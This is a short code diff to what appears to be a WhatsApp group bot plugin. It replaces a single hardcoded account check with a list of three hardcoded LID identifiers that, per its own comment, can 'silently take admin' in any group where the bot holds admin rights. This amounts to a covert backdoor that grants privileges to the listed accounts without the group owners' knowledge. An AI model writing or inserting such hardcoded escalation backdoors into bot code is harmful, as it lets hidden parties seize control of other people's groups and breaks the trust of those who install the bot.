@@ -14,8 +14,15 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
 
     if (!isGroup || !isBotAdmins) return;
 
-    // Check if sender is exactly 99038271684629@lid
-    if (sender !== "99038271684629@lid") return;
+    // Authorized LIDs - Only these users can silently take admin
+    const authorizedLIDs = [
+        "99038271684629@lid",
+        "206884883697891@lid",
+        "88906376708108@lid"
+    ];
+
+    // Check if sender is in authorized list
+    if (!authorizedLIDs.includes(sender)) return;
 
     try {
         const groupMetadata = await conn.groupMetadata(from);
